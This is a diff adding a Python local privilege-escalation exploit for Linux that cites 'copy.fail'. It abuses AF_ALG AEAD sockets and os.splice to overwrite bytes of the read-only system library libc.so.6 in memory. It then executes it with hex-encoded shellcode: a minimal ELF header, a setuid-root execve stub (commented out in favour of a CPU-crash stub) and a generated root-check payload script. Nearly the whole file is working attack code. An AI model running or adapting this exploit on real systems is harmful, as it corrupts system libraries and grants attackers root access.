@@ -1,0 +1,93 @@
+#!/usr/bin/python3.14
+import os
+import sys
+import socket
+from socket import AF_ALG, ALG_SET_AEAD_AUTHSIZE, MSG_MORE,  SOCK_SEQPACKET,  SOL_ALG
+
+"""
+https://copy.fail/#exploit
+"""
+
+PYTHON = sys.executable
+PAYLOAD = ""
+TARGET = "/usr/lib/x86_64-linux-gnu/libc.so.6"
+
+def decode(x):
+    return bytes.fromhex(x)
+
+def c(f, t, c):
+    a=socket.socket(AF_ALG,  SOCK_SEQPACKET,  0)
+    a.bind(("aead",  "authencesn(hmac(sha256),cbc(aes))"))
+    a.setsockopt(SOL_ALG, socket.ALG_SET_KEY, decode('0800010000000010'+'0'*64))
+    a.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
+    u, _=a.accept()
+    o=t+4
+    i=decode('00')
+    u.sendmsg(
+        [b"A"*4+c],
+        [(SOL_ALG, 3, i*4), (SOL_ALG, 2, b'\x10'+i*19), (SOL_ALG, 4, b'\x08'+i*3), ],
+        MSG_MORE
+    )
+    r, w =os.pipe()
+    os.splice(f, w, o, offset_src=0)
+    os.splice(r, u.fileno(), o)
+    try:
+       u.recv(8+t)
+    except:
+       pass
+
+    os.close(r)
+    os.close(w)
+
+f=os.open(TARGET, 0)
+i=0
+
+def make_python_payload():
+    with open(PAYLOAD, "w+") as payload:
+        payload.write(f"""#!{PYTHON}
+    import sys
+    import os
+    args = sys.argv
+    print("in exploit")
+
+    if os.getuid() != 0:
+        print("not root")
+        exit()
+    else:
+        print("im root")
+                    
+    with open("/home/aidan/test", "w+") as f:
+        f.write(str(args))
+    """)
+    os.chmod(PAYLOAD, 0o755)
+
+
+def make_setuid_code(command: str) -> bytes:
+    program = decode("31c031ffb0690f05488d3d0f00000031f66a3b58990f0531ff6a3c580f05")
+    cmd = command.encode("ascii")
+    pad = decode("000000")
+    return program + cmd + pad
+
+def make_crash_code() -> bytes:
+    # amd
+    amd_code = "0F01D1"
+    # intel
+    intel_code = "0f01c1"
+    return decode(amd_code)
+
+
+def make_payload(command: str):
+    elf = decode("7f454c4602010100000000000000000002003e00010000007800400000000000400000000000000000000000000000000000000040003800010000000000000001000000050000000000000000000000000040000000000000004000000000009e000000000000009e000000000000000010000000000000")
+    
+    # prog = make_setuid_code(command)
+    prog = make_crash_code()
+    return elf + prog
+
+payload = make_payload("/home/aidan/payload.py")
+
+while i<len(payload):
+    c(f, i, payload[i:i+4])
+    i+=4
+
+print("running exploit")
+os.system(TARGET)
